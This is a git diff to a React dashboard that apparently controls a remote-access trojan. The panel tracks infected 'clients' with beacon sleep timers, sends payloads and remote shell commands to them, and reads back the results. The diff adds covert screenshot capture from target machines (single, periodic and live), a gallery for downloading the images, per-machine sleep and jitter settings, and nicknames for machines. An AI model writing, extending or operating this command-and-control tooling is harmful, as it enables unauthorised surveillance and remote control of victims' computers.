@@ -1,5 +1,55 @@
 import './App.css';
 import { useEffect, useState, useCallback, useRef } from 'react'
+import { createPortal } from 'react-dom'
+
+// Reusable custom checkbox component (vk)
+function VkCheckbox({ id, checked=false, onChange, label, className='' }){
+  const uid = id || ('vkcb-' + Math.random().toString(36).slice(2,8))
+  return (
+    <label className={`vk-checkbox ${className||''}`} htmlFor={uid}>
+      <input id={uid} type='checkbox' checked={!!checked} onChange={e => onChange && onChange(e.target.checked)} />
+      <span className='vk-box' aria-hidden='true'>
+        <svg className='vk-check' viewBox='0 0 24 24' width='14' height='14' xmlns='http://www.w3.org/2000/svg'>
+          <polyline points='20 6 9 17 4 12' stroke='currentColor' fill='none' strokeWidth='2.6' strokeLinecap='round' strokeLinejoin='round' />
+        </svg>
+      </span>
+      {label ? <span className='vk-label'>{label}</span> : null}
+    </label>
+  )
+}
+// Custom select (vk) - simple dropdown replacement for native <select>
+function VkSelect({ value, onChange, options = [], placeholder = 'Select' }){
+  const [open, setOpen] = useState(false)
+  const ref = useRef(null)
+  useEffect(()=>{
+    const onDoc = (e) => { if(ref.current && !ref.current.contains(e.target)) setOpen(false) }
+    document.addEventListener('click', onDoc)
+    document.addEventListener('keydown', (ev) => { if(ev.key === 'Escape') setOpen(false) })
+    return ()=>{ document.removeEventListener('click', onDoc) }
+  }, [])
+  const selected = options.find(o => o.value === value)
+  return (
+    <div className={`vk-select ${open? 'open':''}`} ref={ref}>
+      <div className='vk-select__trigger' onClick={()=>setOpen(s=>!s)} role='button' tabIndex={0} onKeyDown={e=>{ if(e.key==='Enter' || e.key===' ') setOpen(s=>!s) }}>
+        <div className='vk-select__label'>{selected ? selected.label : placeholder}</div>
+        <div className='vk-select__caret'>▾</div>
+      </div>
+      {open && (
+        <div className='vk-select__list' role='listbox'>
+          {options.map(o => (
+            <div key={o.value} role='option' aria-selected={o.value===value} className={`vk-select__option ${o.value===value? 'selected':''}`} onClick={()=>{ onChange(o.value); setOpen(false) }}>
+              {o.label}
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  )
+}
+
+// Nickname helpers persisted in localStorage
+function loadNicknames(){ try{ return JSON.parse(localStorage.getItem('vk_nicknames')||'{}') }catch{return {}} }
+function saveNicknames(map){ try{ localStorage.setItem('vk_nicknames', JSON.stringify(map||{})) }catch{} }
 
 const SERVER = 'http://127.0.0.1:8000'
 
@@ -59,6 +109,30 @@ function watchForResult(taskId, machineId, onFound, intervalMs = 1500, timeoutMs
   to = setTimeout(() => { stop(); }, timeoutMs)
   return stop
 }
+
+// Poll server for a screenshot uploaded for a specific task_id for a machine
+function watchForScreenshot(taskId, machineId, onFound, intervalMs = 700, timeoutMs = 15000){
+  let stopped = false
+  let iv = null
+  let to = null
+  const stop = () => { stopped = true; if(iv) clearInterval(iv); if(to) clearTimeout(to) }
+  const check = async () => {
+    if (stopped) return
+    try{
+      const r = await fetch(SERVER + '/screenshot?machine_id=' + encodeURIComponent(machineId))
+      const d = await r.json()
+      const s = d.screenshot
+      if (s && s.task_id === taskId) {
+        stop()
+        try{ onFound(s) }catch(e){ console.error(e) }
+      }
+    }catch(e){ /* ignore */ }
+  }
+  check()
+  iv = setInterval(check, intervalMs)
+  to = setTimeout(() => { stop(); }, timeoutMs)
+  return stop
+}
 function Header({clients, tasks}){
   return (
     <div className="headerRow">
@@ -106,6 +180,17 @@ function App(){
   })
   // simple ticking state to trigger per-second re-renders for countdowns
   const [now, setNow] = useState(() => Date.now()/1000)
+  const [nicknames, setNicknames] = useState(() => loadNicknames())
+
+  const setNickname = (machineId, name) => {
+    setNicknames(prev => {
+      const next = {...(prev||{})}
+      if(name) next[machineId] = name
+      else delete next[machineId]
+      saveNicknames(next)
+      return next
+    })
+  }
 
   // FIXED — stable callback (this prevents infinite polling spawns)
   const fetchCounts = useCallback(async () => {
@@ -211,11 +296,12 @@ function App(){
             </div>
           )}
 
-          {tab === 'clients' && <div className="panel"><ClientsPanel server={SERVER} payloads={payloads} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} now={now} /></div>}
+          {/* Clients panel (rendered below with nickname support) */}
           {tab === 'tasks' && <div className="panel"><TasksPanel server={SERVER} /></div>}
           {tab === 'payloads' && <div className="panel"><PayloadsPanel server={SERVER} payloads={payloads} setPayloads={setPayloads} /></div>}
-          {tab === 'results' && <div className="panel"><ResultsPanel server={SERVER} /></div>}
-          {tab === 'machine' && selectedMachine && <div className="panel"><MachinePanel server={SERVER} machineId={selectedMachine} payloads={payloads} /></div>}
+          {tab === 'clients' && <div className="panel"><ClientsPanel server={SERVER} payloads={payloads} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} now={now} nicknames={nicknames} setNickname={setNickname} /></div>}
+          {tab === 'results' && <div className="panel"><ResultsPanel server={SERVER} nicknames={nicknames} setNickname={setNickname} /></div>}
+          {tab === 'machine' && selectedMachine && <div className="panel"><MachinePanel server={SERVER} machineId={selectedMachine} payloads={payloads} nicknames={nicknames} setNickname={setNickname} /></div>}
           {tab === 'customize' && <div className="panel"><CustomizePanel /></div>}
           {tab === 'settings' && <div className="panel"><SettingsPanel /></div>}
 
@@ -228,33 +314,35 @@ function App(){
 
 /* ---------------------- OTHER COMPONENTS (unchanged) ---------------------- */
 
-function ClientsPanel({server, payloads=[]}){
+function ClientsPanel({server, payloads=[], nicknames = {}, setNickname, onOpenMachine, now}){
   const [items, setItems] = useState([])
   useEffect(()=>{ (async ()=>{ try{ const r=await fetch(server + '/clients_status'); const d=await r.json(); setItems(Object.entries(d.clients_status||{}).map(([id,s]) => ({id, ...s}))) }catch(e){} })() }, [server])
   return (
     <div>
       <h3>Clients</h3>
       <div className='card' style={{marginTop:8}}>
-        <table className='table'><thead><tr><th>#</th><th>machine_id</th><th>last_seen</th><th>sleeping_in(s)</th><th>has_task</th><th>actions</th></tr></thead>
+        <table className='table'><thead><tr><th>#</th><th>machine_id</th><th>nickname</th><th>last_seen</th><th>sleeping_in(s)</th><th>has_task</th><th>actions</th></tr></thead>
         <tbody>
-        {items.map((c,i)=> <ClientRow key={c.id} idx={i} c={c} payloads={payloads} server={server} />)}
+        {items.map((c,i)=> <ClientRow key={c.id} idx={i} c={c} payloads={payloads} server={server} nicknames={nicknames} setNickname={setNickname} onOpenMachine={onOpenMachine} now={now} />)}
         </tbody></table>
       </div>
     </div>
   )
 }
 
-function ClientRow({idx, c, payloads, server, now}){
+function ClientRow({idx, c, payloads, server, now, nicknames = {}, setNickname, onOpenMachine}){
   // prefer App-level `now` when available via closure — otherwise fallback to Date.now()/1000
   const useNow = typeof window !== 'undefined' && window.__VK_NOW ? window.__VK_NOW : null
   const nowVal = useNow || Date.now()/1000
   // compute sleeping seconds if present
   const secs = (typeof c.sleeping_until === 'number' && c.sleeping_until) ? Math.max(0, Math.round(c.sleeping_until - nowVal)) : null
   const sleeping = secs !== null && secs > 0
+  const nick = (nicknames && nicknames[c.id]) || ''
   return (
-    <tr className='rowClickable' onClick={()=>{ if(typeof arguments[0] === 'object'){} }}>
+    <tr className='rowClickable' onClick={() => onOpenMachine ? onOpenMachine(c.id) : null}>
       <td>{idx+1}</td>
-      <td style={{maxWidth:560}}>{c.id}</td>
+      <td style={{maxWidth:380}}>{c.id}</td>
+      <td style={{maxWidth:220, color:'var(--muted)'}}>{nick || <span style={{color:'var(--muted)'}}>-</span>} <button className='btn' style={{marginLeft:8,padding:'4px 6px'}} onClick={(e)=>{ e.stopPropagation(); const res = window.prompt('Set nickname for this machine (blank to clear):', nick || ''); if(res !== null){ setNickname && setNickname(c.id, res || '') } }}>✎</button></td>
       <td>{c.last_seen? formatAgo(c.last_seen) : '-'}</td>
       <td><span style={{display:'inline-flex', alignItems:'center'}}><span className={`statusDot ${sleeping? 'sleeping':'idle'}`} />{secs !== null ? <AnimatedCountdown value={secs} /> : '-'}</span></td>
       <td>{String(c.has_task)}</td>
@@ -457,7 +545,7 @@ function PayloadsPanel({server, payloads = [], setPayloads}){
   )
 }
 
-function ResultsPanel({server}){
+function ResultsPanel({server, nicknames = {}, setNickname}){
   const [items, setItems] = useState([])
   const [preview, setPreview] = useState(null)
   const [selectedIds, setSelectedIds] = useState(() => new Set())
@@ -544,11 +632,7 @@ function ResultsPanel({server}){
       <div style={{display:'flex', gap:8, marginTop:10, alignItems:'center'}}>
         <input placeholder='search task id, machine or content' value={query} onChange={e=>setQuery(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit', flex:1}} />
         <input placeholder='machine id filter' value={machineFilter} onChange={e=>setMachineFilter(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit', width:220}} />
-        <select value={quickRange} onChange={e=>setQuickRange(e.target.value)} style={{padding:8, borderRadius:8, background:'transparent'}}>
-          <option value='all'>All time</option>
-          <option value='24h'>Last 24h</option>
-          <option value='7d'>Last 7d</option>
-        </select>
+        <VkSelect value={quickRange} onChange={setQuickRange} options={[{label:'All time', value:'all'},{label:'Last 24h', value:'24h'},{label:'Last 7d', value:'7d'}]} placeholder='Range' />
         <button className='btn' onClick={loadAll} disabled={loading}>{loading? 'Refreshing...':'Refresh'}</button>
         <button className='btn btn--fancy' onClick={deleteSelected} disabled={deleting || selectedIds.size===0}>{deleting? 'Deleting...': `Delete (${selectedIds.size})`}</button>
       </div>
@@ -557,7 +641,7 @@ function ResultsPanel({server}){
         <table className='table'>
           <thead>
             <tr>
-              <th style={{width:34}}><input type='checkbox' onChange={()=> selectAllVisible(filtered)} checked={filtered.length>0 && filtered.every(x => selectedIds.has(x.id))} /></th>
+              <th style={{width:34}}><VkCheckbox className='vk-small' checked={filtered.length>0 && filtered.every(x => selectedIds.has(x.id))} onChange={() => selectAllVisible(filtered)} /></th>
               <th>id</th>
               <th>task_id</th>
               <th>machine</th>
@@ -569,10 +653,18 @@ function ResultsPanel({server}){
           <tbody>
             {filtered.map(r => (
               <tr key={r.id}>
-                <td><input type='checkbox' checked={selectedIds.has(r.id)} onChange={()=>toggleSelect(r.id)} /></td>
+                <td><VkCheckbox className='vk-small' checked={selectedIds.has(r.id)} onChange={() => toggleSelect(r.id)} /></td>
                 <td style={{fontFamily:'ui-monospace, monospace', fontSize:12}}>{r.id}</td>
                 <td style={{fontFamily:'ui-monospace, monospace'}}>{r.task_id}</td>
-                <td style={{maxWidth:260}}>{r.machine_id}</td>
+                <td style={{maxWidth:260}}>
+                  <div style={{display:'flex', flexDirection:'column'}}>
+                    <div style={{display:'flex', alignItems:'center', gap:8}}>
+                      <div style={{fontWeight:700}}>{r.machine_id}</div>
+                      <button className='btn' style={{padding:'4px 6px'}} onClick={async ()=>{ const res = window.prompt('Set nickname for this machine (blank to clear):', (nicknames && nicknames[r.machine_id]) || ''); if(res !== null){ setNickname && setNickname(r.machine_id, res || '') } }}>✎</button>
+                    </div>
+                    <div style={{fontSize:12, color:'var(--muted)'}}>{nicknames && nicknames[r.machine_id] ? nicknames[r.machine_id] : ''}</div>
+                  </div>
+                </td>
                 <td>{new Date((r.timestamp||0)*1000).toLocaleString()}</td>
                 <td style={{maxWidth:420}}>{typeof r.result === 'string' ? (r.result.length>160? r.result.slice(0,160)+'...':r.result): JSON.stringify(r.result)}</td>
                 <td style={{display:'flex', gap:8}}>
@@ -595,10 +687,23 @@ function ResultsPanel({server}){
   )
 }
 
-function MachinePanel({server, machineId, payloads=[]}){
+function MachinePanel({server, machineId, payloads=[], nicknames = {}, setNickname}){
   const [terminalCmd, setTerminalCmd] = useState('')
   const [log, setLog] = useState([])
   const terminalRef = useRef(null)
+  const [screenshot, setScreenshot] = useState(null)
+  const [live, setLive] = useState(false)
+  const [periodicEnabled, setPeriodicEnabled] = useState(false)
+  const [maxScreens, setMaxScreens] = useState(null)
+  const [minSleep, setMinSleep] = useState(null)
+  const [maxSleep, setMaxSleep] = useState(null)
+  const [savedScreensCount, setSavedScreensCount] = useState(0)
+  const [screenshotsList, setScreenshotsList] = useState([])
+  const [galleryOpen, setGalleryOpen] = useState(false)
+  const liveRef = useRef(null)
+  const [liveFreq, setLiveFreq] = useState(2000)
+  const screenshotIdRef = useRef(null)
+  const [activeTab, setActiveTab] = useState('home') // 'home' | 'screen' | 'config'
 
   const runCmd = async () =>{
     if(!terminalCmd) return
@@ -653,42 +758,291 @@ function MachinePanel({server, machineId, payloads=[]}){
     }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
   }
 
+  const requestScreenshotOnce = async () =>{
+    try{
+      const id = genId()
+      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=SCREENSHOT&machine_id=${encodeURIComponent(machineId)}`
+      await fetch(url, {method:'POST'})
+      setScreenshot(null)
+      // watch for the screenshot upload
+      watchForScreenshot(id, machineId, (found) => {
+        setScreenshot(found.image_b64)
+      })
+    }catch(e){ setLog(prev => [`Error requesting screenshot: ${String(e)}`, ...prev]) }
+  }
+
+  const loadScreenshots = async () =>{
+    try{
+      const r = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId))
+      const d = await r.json()
+      const list = (d.screenshots || [])
+      setScreenshotsList(list)
+      setSavedScreensCount(list.length)
+      if (list.length){
+        const last = list[list.length - 1]
+        setScreenshot(last.image_b64)
+        screenshotIdRef.current = last.id
+      } else {
+        setScreenshot(null)
+        screenshotIdRef.current = null
+      }
+    }catch(e){ /* ignore */ }
+  }
+
+  const downloadImage = (b64, id) =>{
+    try{
+      const a = document.createElement('a')
+      a.href = `data:image/png;base64,${b64}`
+      a.download = `${machineId}_${id || Date.now()}.png`
+      document.body.appendChild(a)
+      a.click()
+      a.remove()
+    }catch(e){ setLog(prev => [`Download error: ${String(e)}`, ...prev]) }
+  }
+
+  // load current periodic screenshots setting for this machine
+  useEffect(()=>{
+    let mounted = true
+    ;(async ()=>{
+      try{
+        const r = await fetch(server + '/clients_status')
+        const d = await r.json()
+        const info = (d.clients_status || {})[machineId] || {}
+        if(mounted) setPeriodicEnabled(Boolean(info.periodic_screenshots))
+        // load per-machine config (max screenshots retained)
+        try{
+          const rc = await fetch(server + '/machine_config?machine_id=' + encodeURIComponent(machineId))
+          const dc = await rc.json()
+          if (mounted) {
+            setMaxScreens(dc.config && dc.config.max_screen_images)
+            setMinSleep(dc.config && dc.config.min_sleep)
+            setMaxSleep(dc.config && dc.config.max_sleep)
+          }
+        }catch(e){}
+        // load current screenshots list & count
+        try{ await loadScreenshots() }catch(e){}
+      }catch(e){}
+    })()
+    return ()=> mounted = false
+  }, [server, machineId])
+
+  const togglePeriodic = async () =>{
+    try{
+      const enable = !periodicEnabled
+      const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${enable ? 'true':'false'}`
+      const r = await fetch(url, { method: 'POST' })
+      if(r.ok){ setPeriodicEnabled(enable) }
+    }catch(e){ setLog(prev => [`Toggle periodic error: ${String(e)}`, ...prev]) }
+  }
+
+  const saveConfig = async () =>{
+    try{
+      const body = { machine_id: machineId, max_screen_images: maxScreens, min_sleep: minSleep, max_sleep: maxSleep }
+      const r = await fetch(server + '/set_machine_config', { method: 'POST', headers: {'content-type':'application/json'}, body: JSON.stringify(body) })
+      if(r.ok){
+        // refresh saved screenshots count
+        try{ const rs = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId)); const ds = await rs.json(); setSavedScreensCount((ds.screenshots||[]).length) }catch(e){}
+      }
+    }catch(e){ setLog(prev => [`Save config error: ${String(e)}`, ...prev]) }
+  }
+
+  // Poll server for the list of screenshots so gallery and preview stay up-to-date
+  useEffect(() => {
+    let mounted = true
+    let iv = null
+    const poll = async () => {
+      if (!mounted) return
+      try{
+        await loadScreenshots()
+      }catch(e){}
+    }
+    poll()
+    iv = setInterval(poll, 2000)
+    return () => { mounted = false; if (iv) clearInterval(iv) }
+  }, [server, machineId])
+
+  const startLive = () =>{
+    if(liveRef.current) return
+    setLive(true)
+    // enqueue first immediately
+    requestScreenshotOnce()
+    const iv = setInterval(()=> requestScreenshotOnce(), Math.max(500, Number(liveFreq) || 2000))
+    liveRef.current = iv
+  }
+
+  const stopLive = () =>{
+    setLive(false)
+    if(liveRef.current){ clearInterval(liveRef.current); liveRef.current = null }
+  }
+
+  const handleLiveToggle = (on) => {
+    if (on) startLive(); else stopLive();
+  }
+
   return (
     <div className='machinePanel'>
       <div className='machineHeader'>
         <div>
           <h3>Machine</h3>
-          <div className='small'>{machineId}</div>
+          <div className='small'>{machineId} {nicknames && nicknames[machineId] ? <span style={{color:'var(--muted)', marginLeft:8}}>({nicknames[machineId]})</span> : null}</div>
         </div>
         <div className='machineActions'>
           <button className='btn' onClick={()=>{ navigator.clipboard && navigator.clipboard.writeText(machineId) }}>Copy ID</button>
+          <button className='btn' onClick={()=>{ const res = window.prompt('Set nickname for this machine (blank to clear):', nicknames && nicknames[machineId] ? nicknames[machineId] : ''); if(res !== null){ setNickname && setNickname(machineId, res || '') } }}>Set Nickname</button>
           <button className='btn' onClick={()=>{ /* TODO: remote check-in actions */ }}>Refresh</button>
         </div>
       </div>
 
-      <div className='card'>
-        <h4>Terminal</h4>
-        <div style={{marginTop:10}}>
-          <h5>Terminal output</h5>
-          <div ref={terminalRef} className='terminalWindow'>
-            {log.map((l,i)=> {
-              const cls = l.startsWith('Sent:') ? 'term-sent' : (l.startsWith('Waiting for result') ? 'term-wait' : (l.startsWith('Result') ? 'term-result' : (l.startsWith('Failed')||l.startsWith('Error') ? 'term-error' : '')))
-              return <div key={i} className={'terminalLine ' + cls}>{l}</div>
-            })}
-          </div>
-        </div>
-        <div style={{marginTop:8}} className='terminalBox'>
-          <input autoFocus value={terminalCmd} onChange={e=>setTerminalCmd(e.target.value)} onKeyDown={e=>{ if(e.key === 'Enter'){ e.preventDefault(); runCmd() } }} className='terminalInput' placeholder='e.g. whoami or ipconfig' />
-          <button className='btn btn--fancy' onClick={runCmd}>Run</button>
-        </div>
+      <div className='machineTabs'>
+        <button className={`tabBtn ${activeTab==='home' ? 'active':''}`} onClick={()=>setActiveTab('home')}>Home</button>
+        <button className={`tabBtn ${activeTab==='screen' ? 'active':''}`} onClick={()=>setActiveTab('screen')}>Screen</button>
+        <button className={`tabBtn ${activeTab==='config' ? 'active':''}`} onClick={()=>setActiveTab('config')}>Config</button>
       </div>
 
-      <div className='card'>
-        <h4>Payloads</h4>
-        <div className='payloadGrid'>
-          {payloads.map(p => <button key={p.id} className='payloadBtn' onClick={()=>sendPayload(p.file_name)}>{p.file_name}</button>)}
+      {activeTab === 'home' && (
+        <>
+          <div className='card'>
+            <h4>Terminal</h4>
+            <div style={{marginTop:10}}>
+              <h5>Terminal output</h5>
+              <div ref={terminalRef} className='terminalWindow'>
+                {log.map((l,i)=> {
+                  const cls = l.startsWith('Sent:') ? 'term-sent' : (l.startsWith('Waiting for result') ? 'term-wait' : (l.startsWith('Result') ? 'term-result' : (l.startsWith('Failed')||l.startsWith('Error') ? 'term-error' : '')))
+                  return <div key={i} className={'terminalLine ' + cls}>{l}</div>
+                })}
+              </div>
+            </div>
+            <div style={{marginTop:8}} className='terminalBox'>
+              <input autoFocus value={terminalCmd} onChange={e=>setTerminalCmd(e.target.value)} onKeyDown={e=>{ if(e.key === 'Enter'){ e.preventDefault(); runCmd() } }} className='terminalInput' placeholder='e.g. whoami or ipconfig' />
+              <button className='btn btn--fancy' onClick={runCmd}>Run</button>
+            </div>
+          </div>
+
+          <div className='card'>
+            <h4>Payloads</h4>
+            <div className='payloadGrid'>
+              {payloads.map(p => <button key={p.id} className='payloadBtn' onClick={()=>sendPayload(p.file_name)}>{p.file_name}</button>)}
+            </div>
+          </div>
+        </>
+      )}
+
+      {activeTab === 'screen' && (
+        <div className='card tabContent active'>
+          <h4>Screen</h4>
+          <div style={{display:'flex', gap:12, alignItems:'center'}}>
+            <button className='btn' onClick={requestScreenshotOnce}>Request</button>
+
+            <VkCheckbox className='vk-small' checked={periodicEnabled} onChange={async (on) => {
+                try{
+                  const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${on ? 'true':'false'}`
+                  const r = await fetch(url, { method: 'POST' })
+                  if(r.ok) setPeriodicEnabled(on)
+                }catch(err){ setLog(prev => [`Toggle error: ${String(err)}`, ...prev]) }
+              }} label={periodicEnabled ? 'Periodic ON' : 'Periodic OFF'} />
+
+            <VkCheckbox className='vk-small' checked={live} onChange={(on)=>{ setLive(on); handleLiveToggle(on) }} label={live ? 'Live ON' : 'Live OFF'} />
+
+            <div style={{display:'flex', alignItems:'center', gap:8, marginLeft:'auto'}}>
+              <label className='small'>Freq (ms)</label>
+              <input type='number' value={liveFreq} onChange={e=>setLiveFreq(Number(e.target.value||2000))} style={{width:120, padding:6, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent'}} />
+            </div>
+          </div>
+          {galleryOpen && createPortal(
+            <div className='galleryModal' onClick={()=>setGalleryOpen(false)}>
+              <div className='galleryContent' onClick={e=>e.stopPropagation()}>
+                <button className='modalClose' onClick={()=>setGalleryOpen(false)}>Close</button>
+                <h3 style={{color:'var(--accent)'}}>All Screenshots ({screenshotsList.length})</h3>
+                <div style={{height:12}} />
+                <div className='galleryGrid'>
+                  {screenshotsList.slice().reverse().map(s => (
+                    <div key={s.id} className='thumb' style={{borderRadius:8}}>
+                      <img className='thumbImg' alt={s.id} src={s.image_b64 ? `data:image/png;base64,${s.image_b64}` : ''} style={{height:140}} />
+                      <div className='thumbMeta'>
+                        <div className='thumbTime'>{s.task_id ? s.task_id : new Date((s.timestamp||0)*1000).toLocaleString()}</div>
+                        <div style={{display:'flex', gap:8}}>
+                          <button className='thumbDelete' onClick={async ()=>{ try{ const r = await fetch(server + '/screenshot?id=' + encodeURIComponent(s.id), { method: 'DELETE' }); if(r.ok){ await loadScreenshots() } }catch(err){ setLog(prev => [`Delete screenshot error: ${String(err)}`, ...prev]) } }}>Del</button>
+                          <button className='thumbDelete' onClick={()=>downloadImage(s.image_b64, s.id)}>↓</button>
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            </div>,
+            document.body
+          )}
+
+          <div style={{marginTop:8}}>
+            {screenshot ? (
+              <img alt='screenshot' src={`data:image/png;base64,${screenshot}`} style={{maxWidth:'100%', borderRadius:8, border:'1px solid rgba(255,255,255,0.03)'}} />
+            ) : (
+              <div style={{padding:12}} className='term-wait'>No screenshot yet</div>
+            )}
+
+            {/* Gallery of recent screenshots (preview up to 5) */}
+            <div className='screenshotGallery'>
+              {screenshotsList.length === 0 && <div style={{color:'var(--muted)'}}>No saved screenshots</div>}
+              {screenshotsList.slice(-5).map(s => (
+                <div key={s.id} className='thumb'>
+                  <img className='thumbImg' alt={s.id} src={s.image_b64 ? `data:image/png;base64,${s.image_b64}` : ''} onClick={()=>{ setScreenshot(s.image_b64); screenshotIdRef.current = s.id }} />
+                  <div className='thumbMeta'>
+                    <div className='thumbTime'>{s.task_id ? s.task_id : new Date((s.timestamp||0)*1000).toLocaleString()}</div>
+                    <div style={{display:'flex', gap:8}}>
+                      <button className='thumbDelete' onClick={async (e)=>{ e.stopPropagation(); try{ const r = await fetch(server + '/screenshot?id=' + encodeURIComponent(s.id), { method: 'DELETE' }); if(r.ok){ await loadScreenshots() } }catch(err){ setLog(prev => [`Delete screenshot error: ${String(err)}`, ...prev]) } }}>Del</button>
+                      <button className='thumbDelete' onClick={(e)=>{ e.stopPropagation(); downloadImage(s.image_b64, s.id) }}>↓</button>
+                    </div>
+                  </div>
+                </div>
+              ))}
+              {screenshotsList.length > 5 && (
+                <div className='thumb' onClick={()=>setGalleryOpen(true)} style={{cursor:'pointer'}}>
+                  <div className='thumbMore'>+{screenshotsList.length - 5} more</div>
+                </div>
+              )}
+            </div>
+          </div>
         </div>
-      </div>
+      )}
+
+      {activeTab === 'config' && (
+        <div className='card'>
+          <h4>Config</h4>
+          <div style={{display:'flex', gap:8, alignItems:'center', marginTop:6}}>
+            <div style={{display:'flex', flexDirection:'column'}}>
+              <label className='small'>Periodic screenshots</label>
+              <div style={{display:'flex', gap:8, marginTop:6, alignItems:'center'}}>
+                <VkCheckbox className='vk-small' checked={periodicEnabled} onChange={async (on) => { try{ const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${on ? 'true':'false'}`; const r = await fetch(url, { method:'POST' }); if(r.ok) setPeriodicEnabled(on) }catch(err){ setLog(prev => [`Toggle error: ${String(err)}`, ...prev]) } }} />
+                <button className='btn' onClick={()=>{ navigator.clipboard && navigator.clipboard.writeText(machineId) }}>Copy ID</button>
+                <button className='btn' onClick={async ()=>{ try{ const r = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId)); const d = await r.json(); setSavedScreensCount((d.screenshots||[]).length) }catch(e){ setLog(prev => [`Refresh screenshots error: ${String(e)}`, ...prev]) } }}>Refresh</button>
+              </div>
+            </div>
+
+            <div style={{display:'flex', gap:12, alignItems:'center'}}>
+              <div style={{display:'flex', flexDirection:'column'}}>
+                <label className='small'>Max screenshots to keep</label>
+                <input type='number' className='configNumber' value={maxScreens || ''} onChange={e=>setMaxScreens(e.target.value? Number(e.target.value): null)} style={{width:140}} />
+              </div>
+
+              <div style={{display:'flex', flexDirection:'column'}}>
+                <label className='small'>Min sleep (s)</label>
+                <input type='number' className='configNumber' value={minSleep || ''} onChange={e=>setMinSleep(e.target.value? Number(e.target.value): null)} style={{width:120}} />
+              </div>
+
+              <div style={{display:'flex', flexDirection:'column'}}>
+                <label className='small'>Max sleep (s)</label>
+                <input type='number' className='configNumber' value={maxSleep || ''} onChange={e=>setMaxSleep(e.target.value? Number(e.target.value): null)} style={{width:120}} />
+              </div>
+
+              <div style={{display:'flex', alignItems:'center', gap:8}}>
+                <button className='btn btn--fancy' onClick={saveConfig}>Save</button>
+              </div>
+            </div>
+
+            <div style={{marginLeft:'auto', color:'var(--muted)'}}>Saved screenshots: {savedScreensCount}</div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
@@ -788,7 +1142,7 @@ function SettingsPanel(){
 
           <div style={{display:'flex', gap:10, alignItems:'center'}}>
             <label style={{minWidth:220}}>Reduce motion (disable animations)</label>
-            <input type='checkbox' checked={reduce} onChange={e=>setReduce(Boolean(e.target.checked))} />
+            <VkCheckbox className='vk-small' checked={reduce} onChange={(on)=>setReduce(Boolean(on))} />
           </div>
 
           <div style={{display:'flex', gap:8, marginTop:6}}>
